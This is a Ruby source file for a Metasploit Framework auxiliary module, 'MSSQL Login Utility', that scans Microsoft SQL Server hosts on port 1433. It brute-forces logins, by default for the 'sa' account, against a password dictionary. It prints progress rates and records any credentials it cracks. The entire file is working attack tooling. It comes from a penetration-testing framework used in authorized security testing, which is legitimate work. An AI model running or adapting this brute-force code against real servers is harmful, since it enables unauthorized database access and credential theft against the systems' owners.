##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary
        
	include Msf::Exploit::Remote::MSSQL
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	
	def initialize
		super(	
			'Name'           => 'MSSQL Login Utility',
			'Version'        => '$Revision$',
			'Description'    => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',
			'Author'         => 'MC',
			'License'        => MSF_LICENSE
		)
	
		register_options(
			[
				OptString.new('MSSQL_PASS_FILE', [ false, 'A dictionary of passwords to perform a bruteforce attempt']),
				Opt::RPORT(1433)
			], self.class)
	end
		
	def run_host(ip)

		user = datastore['MSSQL_USER'].to_s
		user = "sa" if user.empty?
		
		if (datastore['MSSQL_PASS_FILE'] and not datastore['MSSQL_PASS_FILE'].empty?)
			stime = Time.now.to_f
			cnt = 0
			
			File.open(datastore['MSSQL_PASS_FILE'], "rb") do |fd|
			lcnt = 0
			fd.each_line{lcnt += 1 }
			fd.seek(0)

			fd.each_line do |line|
				line.strip!
				next if line =~ /^#/
				next if line.empty?
				
				ret = do_login(user, line.strip)
				break if ret == :pass
				break if ret == :error
				
				cnt += 1
				if(cnt % 1000 == 0)
					pps = (cnt / (Time.now.to_f - stime)).to_i
					pct = (cnt/lcnt.to_f * 100.0).to_i
					eta = ((lcnt - cnt) / pps / 60.0).to_i
					print_status(
						"#{rhost}:#{rport} completed #{cnt}/#{lcnt} passwords (#{pct}%) " +
						"at a rate of #{pps} per second " +
						"ETA #{eta} minutes"
					)
				end
			end
			end
		else
			do_login(user, datastore['MSSQL_PASS'], true)
		end
	end
	
	def do_login(user='sa', pass='', verbose=false)
	
		print_status("Trying username:'#{user}' with password:'#{pass}' against #{rhost}:#{rport}") if verbose
		begin			
			done = mssql_login(user, pass)

			if (done)
				print_status("#{rhost}:#{rport} successful logged in as '#{user}' with password '#{pass}'")
				report_auth_info(
					:host   => rhost,
					:proto  => 'MSSQL',
					:user   => user,
					:pass   => pass,
					:targ_host => rhost,
					:targ_port => rport
				)
				return :pass
 			else
				print_status("#{rhost}:#{rport} failed to login as '#{user}'") if verbose
				return :fail
			end
		rescue ::Interrupt
			raise $!
		rescue ::Rex::ConnectionError
			return :error
		end
	end
end
